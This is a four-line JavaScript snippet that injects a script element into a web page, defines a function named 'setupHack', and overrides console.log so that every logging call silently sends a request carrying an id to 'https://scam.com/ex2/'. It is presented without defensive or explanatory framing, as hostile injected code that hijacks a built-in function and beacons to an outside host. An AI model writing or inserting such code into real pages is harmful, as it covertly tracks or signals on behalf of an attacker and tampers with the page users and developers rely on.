const e = document.createElement("script");
e.innerText = `function setupHack() {console.log = ()=>{fetch("https://scam.com/ex2/?id=123456782");}; return "OK"}`
document.body.appendChild(e)
setupHack()
